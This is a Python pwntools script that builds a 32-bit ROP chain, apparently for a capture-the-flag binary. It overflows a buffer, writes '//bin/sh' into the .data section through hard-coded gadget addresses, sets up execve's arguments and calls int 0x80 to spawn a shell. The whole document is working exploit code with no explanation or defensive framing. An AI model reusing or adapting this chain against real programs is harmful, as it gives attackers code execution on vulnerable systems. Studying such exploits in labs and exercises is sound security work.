from pwn import *

e = 'a'*24 + 'febp'

# Gadgets for easy access
popeaxcalledi = p32(0x0807416e)
popebx = p32(0x080481c9)
popecxandebx = p32(0x0806ee92)
popedx = p32(0x0806ee6b)
popedi = p32(0x08049adb)
moveaxtoedx = p32(0x08056e65)
xoreax = p32(0x08056420)
inceax = p32(0x0807c2fa)
syscall = p32(0x08049563)

# Write data needed

# pop edx = 0x080da060 (.data)
e += popedx
e += p32(0x080da060)

# pop edi = 0x08049adb (pop edi ; ret)
e += popedi
e += p32(0x08049adb)

# pop eax = 0x69622f2f ('//bi')
e += popeaxcalledi
e += p32(0x69622f2f)

# mov dword ptr [edx], eax
e += moveaxtoedx

# pop edx = 0x080da064 (.data+4)
e += popedx
e += p32(0x080da064)

# pop edi = 0x08049adb (pop edi ; ret)
e += popedi
e += p32(0x08049adb)

# pop eax = 0x68732f6e ('n/sh')
e += popeaxcalledi
e += p32(0x68732f6e)

# mov dword ptr [edx], eax
e += moveaxtoedx

# pop edx = 0x080da068 (.data+8)
e += popedx
e += p32(0x080da068)

# xor eax, eax (Sets eax to NULL)
e += xoreax

# mov dword ptr [edx], eax
e += moveaxtoedx

# Setup arguments

# pop ecx = 0x080da068 (NULL) and pop ebx = 0x080da060 (.data)
e += popecxandebx
e += p32(0x080da068)
e += p32(0x080da060)

# pop edx = 0x080da068 (.data+8)
e += popedx
e += p32(0x080da068)

# Setup syscall number

# inc eax 11 times (0+11=11 for execve)
for i in range(11):
    e += inceax

# Run it

# int 0x80
e += syscall

print(e)
